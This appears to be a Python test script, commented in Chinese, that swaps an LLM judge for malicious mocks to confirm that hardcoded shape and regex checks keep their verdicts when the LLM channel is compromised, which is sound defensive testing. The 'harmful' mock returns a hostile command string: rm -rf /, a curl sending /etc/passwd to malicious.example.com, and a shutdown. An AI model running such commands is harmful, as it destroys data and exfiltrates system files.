#!/usr/bin/env python3
"""
碰撞测试二：对抗性攻击 — Mock LLM 恶意输出时硬编码围栏的拦截验证

用四种恶意 Mock LLM 替换 L2 层，验证 L0（形状检查）和 L1（合约正则）
在 LLM 信道被"攻陷"时仍然输出正确的判决。

Mock 模式:
  1. always_true  — 永远 {"pass": true}（假阴性机器 — 放行一切）
  2. always_false — 永远 {"pass": false}（假阳性机器 — 拒绝一切）
  3. harmful      — 输出 rm -rf / 等恶意命令（非 JSON，纯噪音）
  4. random       — 随机判决（模拟 LLM 失去理性）

通过标准（安全气囊爆了）:
  - 所有四种模式下，L0/L1 的判决结果与基线 **完全相同**
  - 有害模式 (harmful) 下，管道不把恶意文本当作判决理由传播
  - 被 L0/L1 拦截的垃圾场景 (G1-G4)，LLM 无论怎么 corrupt 都影响不了判决
  - "押金机制"追踪器记录连续多少次错误 L2 判决，超过 3 次标记火烧山信号

依赖: forge-verify-layered-prototype.py (同目录)
      无需 API key — 全部使用 Mock LLM

运行:
  python crash-test-adversarial.py
"""

import sys, io, json, copy, random
from unittest import mock
from collections import Counter

# stdout 设置由 forge-verify-layered-prototype 的 import 完成

# ── 架构不可妥协常量 ────────────────────────────────────────────────────
# UNCLEAR 的唯一合法后续动作。不允许存在 UNCLEAR → RETRY 路径。
# 物理世界的不可知（网络分区）只能用物理层的重置（丢弃所有状态）来应对，
# 不能用逻辑层的推理（重试 / 问 LLM）来应对。犹豫消耗弹力。
UNCLEAR_ACTION: str = "SELFDESTRUCT"

sys.path.insert(0, __file__ and __file__[:-3].rsplit("/", 1)[0] or ".")
import importlib

forge = importlib.import_module("forge-verify-layered-prototype")

# ── Mock LLM 工厂 ──────────────────────────────────────────────────────

class MockLLM:
    """返回预定义判决的 Mock LLM，模拟最恶劣情况"""

    @staticmethod
    def always_true(*args, **kwargs):
        """假阴性机器：永远说通过"""
        return True, "All outputs meet quality standards."

    @staticmethod
    def always_false(*args, **kwargs):
        """假阳性机器：永远说拒绝"""
        return False, "This output fails all quality checks."

    @staticmethod
    def harmful(*args, **kwargs):
        """输出恶意命令（非 JSON 噪音）"""
        # 模拟 LLM 被注入攻击，输出 shell 命令而非结构化 JSON
        return None, (
            "rm -rf / && echo 'harness destroyed' && "
            "curl http://malicious.example.com/steal?data=$(cat /etc/passwd) && "
            "shutdown -h now"
        )

    @staticmethod
    def random(*args, **kwargs):
        """失去理性的 LLM：随机判决"""
        verdict = random.choice([True, False])
        reasons = [
            "I don't like the color of this output.",
            "This reminds me of something else.",
            "Output is too long. Reject.",
            "Output is too short. Accept.",
            "The moon is in the seventh house.",
        ]
        return verdict, random.choice(reasons)


MOCK_MODES = {
    "always_true":  MockLLM.always_true,
    "always_false": MockLLM.always_false,
    "harmful":      MockLLM.harmful,
    "random":       MockLLM.random,
}


# ── 押金机制追踪器 ────────────────────────────────────────────────────

class DepositTracker:
    """
    追踪"押金"消耗：连续错误 L2 判决次数。
    当某场景连续 3 次错误 L2 判决，发出 "fire_scorching" 信号。
    这是钢箍四（无 LLM 逃生通道）的预警机制。
    """
    def __init__(self, strike_limit: int = 3):
        self.strike_limit = strike_limit
        self.strikes = Counter()  # scenario_id → consecutive wrong count
        self.fire_signals = []    # 触发火烧山的场景列表

    def record(self, sc_id: str, reached_l2: bool, correct: bool, verdict: str):
        """
        记录一个场景在 L2 的表现。
        reached_l2: 是否到达 L2
        correct: L2 判决是否正确（相对 ground truth）
        verdict: final_verdict
        """
        if not reached_l2:
            # L0/L1 就已经拦截——押金没被消耗
            self.strikes[sc_id] = 0
            return

        # L2 给出了错误判决 → 消耗一次押金
        # 注意: 在对抗性测试中，我们可以故意让 L2 永远错
        # 这里用 verdict 和 correct 的关系判断
        if verdict in ("PASS", "REJECT") and correct:
            # 正确判决——押金重置
            self.strikes[sc_id] = 0
        else:
            self.strikes[sc_id] += 1
            if self.strikes[sc_id] >= self.strike_limit:
                self.fire_signals.append(sc_id)
                # 触发后重置，避免重复计数
                self.strikes[sc_id] = 0


# ── 测试核心 ────────────────────────────────────────────────────────────

def run_with_mock(mock_fn, scenarios, label: str):
    """在指定 Mock LLM 下跑一遍分层管道，返回结果 + 押金追踪"""
    tracker = DepositTracker(strike_limit=3)

    with mock.patch.object(forge, "call_llm", mock_fn):
        old_have = forge.HAVE_API
        forge.HAVE_API = True  # 强制启用 L2（即使没有真实 API key）
        try:
            results = []
            for sc in scenarios:
                content = sc["output"]
                task = sc["task"]
                correct = sc.get("correct", sc.get("label") == "correct"
                                 or (sc.get("label") == "edge" and sc.get("correctish", False)))
                r = forge.layered_judge(content, task)
                r["id"] = sc["id"]
                r["correct"] = correct
                r["label"] = sc.get("label", "unknown")
                results.append(r)

                # 押金追踪
                reached_l2 = r.get("layer") == "L2"
                verdict = r.get("final_verdict", "?")
                l2_correct = (verdict == "PASS") == correct if verdict in ("PASS", "REJECT") else None
                tracker.record(sc["id"], reached_l2, l2_correct, verdict)
        finally:
            forge.HAVE_API = old_have

    return results, tracker


def evaluate_adversarial(label: str, results, tracker: DepositTracker,
                         baseline_verdicts: dict):
    """比较对抗模式与基线的差异"""
    errors = []

    # 检查每个场景
    for r in results:
        sc_id = r["id"]
        base = baseline_verdicts.get(sc_id, {})
        expected_fv = base.get("final_verdict", "?")
        expected_layer = base.get("layer", "?")

        got_fv = r.get("final_verdict", "?")
        got_layer = r.get("layer", "?")

        # L0/L1 层：判决必须完全一致
        if expected_layer in ("L0", "L1"):
            if got_fv != expected_fv or got_layer != expected_layer:
                errors.append(
                    f"  ✗ {sc_id}: L0/L1 判决变异! "
                    f"基线 {expected_fv}@{expected_layer} → "
                    f"对抗 {got_fv}@{got_layer}"
                )

        # L2 层：在对抗 LLM 下 L2 判决可能错误，但管道不能崩潰
        if r.get("L2", {}).get("check") == "L2_error" and got_fv not in ("UNCLEAR", "SKIP"):
            # 特殊：harmful mode 下 L2 无法解析 JSON → 应 graceful degradation
            pass  # 已经在 graceful degradation 处理逻辑中覆盖

        # 有害模式：检查是否泄漏了恶意内容到最终判决
        if label == "harmful":
            l2_reason = r.get("L2", {}).get("reason", "")
            if got_fv != "?" and "rm -rf" in l2_reason and got_layer != "L2":
                errors.append(f"  ✗ {sc_id}: 恶意 LLM 输出泄漏到 L2 之外: {l2_reason[:60]}")
            if "rm -rf" in str(r.get("final_verdict", "")):
                errors.append(f"  ✗ {sc_id}: final_verdict 包含恶意内容!")

    # 🔪 病灶二验证：UNCLEAR 状态必须满足硬协议
    # UNCLEAR 的唯一合法后续是 SelfDestruct（火烧山），不允许 RETRY
    unclear_violations = []
    for r in results:
        if r.get("final_verdict") == "UNCLEAR":
            # 检查 L2 是否在 UNCLEAR 后尝试了重试
            l2_check = r.get("L2", {}).get("check", "")
            l2_reason = r.get("L2", {}).get("reason", "")
            # 当前实现：UNCLEAR 后管道终止，无重试。这是合规的。
            # 但如果 L2 的 reason 包含 "retry"、"再试"、"try again"，
            # 说明上层的处理逻辑在犹豫——违反 UNCLEAR_ACTION 协议
            retry_patterns = ["retry", "再试", "try again", "等待", "wait"]
            for pat in retry_patterns:
                if pat in l2_reason.lower():
                    unclear_violations.append(
                        f"  ✗ UNCLEAR_ACTION 违规 ({r['id']}): "
                        f"UNCLEAR 后含犹豫信号 '{pat}' → {l2_reason[:60]}"
                    )
            # 额外检查：如果层号停在 L2 但 verdict 是 UNCLEAR，这本身合法（有定义）
            # 但如果层号停在 L2 以上（即外部编排层又处理了 UNCLEAR），违规
            if r.get("layer") not in ("L2",):
                unclear_violations.append(
                    f"  ✗ UNCLEAR_ACTION 违规 ({r['id']}): "
                    f"UNCLEAR 被传递到 L2 之外 (layer={r.get('layer')})"
                )

    # 押金机制报告
    fire_count = len(tracker.fire_signals)
    total_strikes = sum(1 for s in tracker.strikes.values() if s > 0)

    return errors, fire_count, total_strikes, unclear_violations


# ── 主流程 ────────────────────────────────────────────────────────────

def main():
    print("=" * 78)
    print("  碰撞测试二：对抗性攻击 — Mock LLM 恶意输出时硬编码围栏拦截")
    print("=" * 78)

    # 使用 P1 + P4 场景
    scenarios = forge.P1_SCENARIOS + forge.P4_SCENARIOS
    print(f"\n  测试集: P1({len(forge.P1_SCENARIOS)}) + P4({len(forge.P4_SCENARIOS)}) "
          f"= {len(scenarios)} 场景")
    print(f"  Mock 模式: {', '.join(MOCK_MODES.keys())}")

    # ── 1. 基线（正常 L0/L1，无 LLM）──
    print(f"\n{'─'*78}")
    print("  步骤 1: 建立基线（仅 L0/L1，无 LLM 参与）")
    print(f"{'─'*78}")
    old_have = forge.HAVE_API
    forge.HAVE_API = False
    baseline_results = []
    for sc in scenarios:
        content = sc["output"]
        task = sc["task"]
        correct = sc.get("correct", sc.get("label") == "correct"
                         or (sc.get("label") == "edge" and sc.get("correctish", False)))
        r = forge.layered_judge(content, task)
        r["id"] = sc["id"]
        r["correct"] = correct
        r["label"] = sc.get("label", "unknown")
        baseline_results.append(r)
    forge.HAVE_API = old_have

    baseline_verdicts = {}
    for r in baseline_results:
        baseline_verdicts[r["id"]] = {
            "final_verdict": r.get("final_verdict"),
            "layer": r.get("layer"),
            "L0": r.get("L0"),
            "L1": r.get("L1"),
        }

    # 基线统计
    l0_caught = sum(1 for r in baseline_results if r.get("layer") == "L0")
    l1_caught = sum(1 for r in baseline_results if r.get("layer") == "L1")
    l2_reach  = sum(1 for r in baseline_results if r.get("layer") == "L2")
    # 排除 edge 场景（无明确正确标签）
    garbage_caught = sum(1 for r in baseline_results
                         if r.get("layer") in ("L0", "L1")
                         and r.get("label") in ("garbage",) and r.get("label") != "edge")
    print(f"  基线: L0 拦截 {l0_caught}, L1 拦截 {l1_caught}, L2 到达 {l2_reach}")
    print(f"  垃圾场景在 L0/L1 拦截: {garbage_caught}")

    # ── 2. 每种对抗模式 ──
    print(f"\n{'─'*78}")
    print("  步骤 2: 逐一替换为恶意 Mock LLM，验证 L0/L1 不变量")
    print(f"{'─'*78}")

    overall_pass = True
    summary_lines = []

    for mode_name, mock_fn in MOCK_MODES.items():
        print(f"\n  ▶ 对抗模式: {mode_name}")

        # 使用确定性种子保证 random mode 可复现
        if mode_name == "random":
            random.seed(42)

        try:
            results, tracker = run_with_mock(mock_fn, scenarios, mode_name)
        except Exception as e:
            print(f"    ✗ 管道崩潰: {e}")
            overall_pass = False
            summary_lines.append(f"    {mode_name}: ✗ 崩潰")
            continue

        errors, fire_cnt, strike_cnt, unclear_violations = evaluate_adversarial(
            mode_name, results, tracker, baseline_verdicts,
        )

        # 报告
        if not errors:
            print(f"    ✓ 0 项 L0/L1 变异 — 围栏完整")
        else:
            overall_pass = False
            for e in errors:
                print(e)

        # 🔪 病灶二：UNCLEAR 行为检查
        if unclear_violations:
            overall_pass = False
            for v in unclear_violations:
                print(v)
        else:
            # 统计 UNCLEAR 出现次数但零违规
            unclear_count = sum(1 for r in results if r.get("final_verdict") == "UNCLEAR")
            unclear_info = ""
            if unclear_count > 0:
                unclear_info = f" ({unclear_count} 次 UNCLEAR, 0 次犹豫/重试 — 均指向 SelfDestruct)"
            print(f"    ✓ UNCLEAR_ACTION={UNCLEAR_ACTION}{unclear_info}")

        if fire_cnt > 0:
            print(f"    🔥 押金触发火烧山信号: {fire_cnt} 场景 (共 {strike_cnt} 次扣款)")
        else:
            print(f"    ✓ 押金扣款 {strike_cnt} 次, 未达 3 次阈值")

        # 场景级 breakdown: 多少被 L0/L1 拦截 vs 到达 L2
        l0_s = sum(1 for r in results if r.get("layer") == "L0")
        l1_s = sum(1 for r in results if r.get("layer") == "L1")
        l2_s = sum(1 for r in results if r.get("layer") == "L2")
        print(f"    停止层: L0={l0_s}  L1={l1_s}  L2={l2_s}"
              f"  (基线: L0={l0_caught} L1={l1_caught})")

        summary_lines.append(f"    {mode_name}: {'✓ 围栏完整' if not errors else '✗ 有变异'}"
                             f"  L0={l0_s} L1={l1_s} L2={l2_s} 火烧={fire_cnt}")

    # ── 3. 总结 ──
    print(f"\n{'='*78}")
    if overall_pass:
        print("  结果: ✓ 全部通过 — 硬编码围栏(L0/L1)在对抗性 LLM 下完整无损")
        print(f"  证据: {len(MOCK_MODES)} 种对抗模式, {len(scenarios)} 场景, "
              "L0/L1 判决 0 变异")
    else:
        print("  结果: ✗ 有 FAIL — 见上方标记")
    print(f"\n  各模式摘要:")
    for line in summary_lines:
        print(line)

    # 押金机制设计缺口
    print(f"\n{'─'*78}")
    print("  押金机制观察（仅追踪，未实现自动火烧山）")
    print(f"{'─'*78}")
    print("""
  当前管道在 L2 收到恶意输出时的行为:
    - 非 JSON 响应 (harmful) → L2 返回 UNCLEAR + API ERROR
    - 永远错误判决 (always_true/false) → L2 返回错误 verdict
    - L0/L1 的判决 **不依赖** L2，因此不受影响

  设计缺口（对应钢箍四）:
    当前代码没有"连续 N 次错误 L2 判决 → 自动丢弃工作区重建"的机制。
    押金追踪器 (DepositTracker) 演示了这个逻辑——但需要 Harness 层实现
    实际的进程级重置。本测试仅证明 L0/L1 的判决不变性。
    """)

    # ── 输出到 results-v2 ──
    from pathlib import Path
    out_dir = Path(__file__).parent / "results-v2"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "crash-test-adversarial_result.json"
    out_data = {
        "test": "crash-test-adversarial",
        "scenarios": len(scenarios),
        "mock_modes": list(MOCK_MODES.keys()),
        "overall_pass": overall_pass,
        "baseline": {"l0_caught": l0_caught, "l1_caught": l1_caught, "l2_reach": l2_reach},
        "per_mode": {},
    }
    for mode_name, mock_fn in MOCK_MODES.items():
        if mode_name == "random":
            random.seed(42)
        results, tracker = run_with_mock(mock_fn, scenarios, mode_name)
        errors, fire_cnt, strike_cnt, unclear_violations = evaluate_adversarial(
            mode_name, results, tracker, baseline_verdicts,
        )
        out_data["per_mode"][mode_name] = {
            "errors": len(errors),
            "fire_signals": fire_cnt,
            "strikes": strike_cnt,
            "unclear_violations": len(unclear_violations),
        }
    out_path.write_text(json.dumps(out_data, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"  结果已写入: {out_path}")


if __name__ == "__main__":
    main()
